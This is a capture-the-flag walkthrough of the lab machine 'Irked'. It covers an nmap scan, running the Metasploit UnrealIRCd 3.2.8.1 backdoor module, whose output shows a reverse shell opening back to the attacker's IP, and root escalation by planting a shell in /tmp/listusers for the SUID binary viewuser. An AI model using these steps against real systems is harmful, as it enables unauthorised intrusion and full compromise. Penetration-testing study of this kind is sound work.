# Irked
### Info:

OS: Linux <br>
IP: 10.10.10.117 <br>
Difficulty : easy <br>

### Enumeration:
```nmap  -p0-10000 10.10.10.117 -T5``` <br>

gives us the results : <br>

```
Nmap scan report for 10.10.10.117
Host is up (0.72s latency).
Not shown: 9996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
6697/tcp open  ircs-u
8067/tcp open  infi-async

Nmap done: 1 IP address (1 host up) scanned in 884.18 seconds
```
Seeing irc service at port 6697 we use hexchat client which gives us:
```
Your host is irked.htb, running version Unreal3.2.8 
```
### Exploitation:
we search for that version on msfconsole : 
```
msf > search Unreal
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/linux/games/ut2004_secure           2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Linux)
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
   exploit/windows/games/ut2004_secure         2004-06-18       good       Unreal Tournament 2004 "secure" Overflow (Win32)
```

Using `exploit/unix/irc/unreal_ircd_3281_backdoor` :
```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] Started reverse TCP double handler on 10.10.16.16:1337 
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo fyw93WRBr4nLaTxv;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "fyw93WRBr4nLaTxv\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.16.16:1337 -> 10.10.10.117:59603) at 2019-01-10 15:54:18 +0530
/bin/bash -i
bash: cannot set terminal process group (637): Inappropriate ioctl for device
bash: no job control in this shell
ircd@irked:~/Unreal3.2$ 
```
Gives us the shell.

### Privilege Escalation:
Running `find / -perm -u=s -type f 2>/dev/null` :
```
ircd@irked:~/Unreal3.2$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
```
We find a non-standard linux binary : `/usr/bin/viewuser` <br>
```
/usr/bin/viewuser
(unknown) :0           2019-01-08 16:39 (:0)
sh: 1: /tmp/listusers: not found
This application is being devleoped to set and test user permissions
It is still being actively developed

```
Making `/tmp/listusers` and putting `shellcode (/bin/sh)` and making it executable, <br>and then running `/usr/bin/viewuser` we get the root

### Things Learned :

Complete Port scanning 

Using exploit unreal_ircd_3281_backdoor

Basic linux Privilege Escalation
